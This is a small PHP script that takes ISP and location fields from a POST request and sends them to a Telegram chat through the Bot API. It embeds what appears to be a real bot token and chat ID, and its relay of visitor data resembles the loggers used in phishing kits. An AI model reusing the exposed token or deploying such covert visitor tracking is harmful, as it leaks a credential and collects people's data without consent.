<?php
// Get ISP info from the request
$isp = $_POST['isp'];
$country = $_POST['country'];
$region = $_POST['region'];
$city = $_POST['city'];

// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
$botToken = '6002701289:AAFzBkmBuaoW382T4e3HzJjHbrXd6aEt5mQ';

// Replace 'YOUR_CHAT_ID' with the chat ID you want to send the message to
$chatId = '2041536580';

// Prepare the message to send
$message = "ISP: $isp\nCountry: $country\nRegion: $region\nCity: $city";

// Send the message to the Telegram bot
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$payload = http_build_query(array(
  'chat_id' => $chatId,
  'text' => $message
));

$ch = curl_init($telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Check if the message was sent successfully
if (!$response) {
  die('Failed to send message to Telegram bot');
}

echo 'Message sent successfully to Telegram bot';
?>
